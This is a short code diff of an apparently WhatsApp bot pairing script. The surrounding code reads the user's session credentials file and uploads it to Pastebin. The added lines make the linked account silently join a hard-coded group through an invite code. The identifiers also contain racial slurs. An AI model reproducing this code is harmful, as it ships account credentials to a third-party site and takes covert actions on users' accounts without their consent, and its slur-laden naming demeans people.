@@ -145,7 +145,7 @@ async function startnigg(phone) {
           let data1 = await readFile(`${sessionFolder}/creds.json`)
           const output = await pastebin.createPaste({
             text: data1.toString(),
-            title: "Prince bot",
+            title: "PrinceMd",
             format: "javascript",
             privacy: PrivacyLevel.UNLISTED,
             expiration: ExpirationTime.ONE_MONTH
@@ -155,6 +155,8 @@ async function startnigg(phone) {
           console.log(sessi)
           await delay(2000)
           let guru = await negga.sendMessage(negga.user.id, { text: sessi })
+          await delay(2000)
+          await negga.groupAcceptInvite("Jo5bmHMAlZpEIp75mKbwxP");
           await delay(2000)
           await negga.sendMessage(
             negga.user.id,
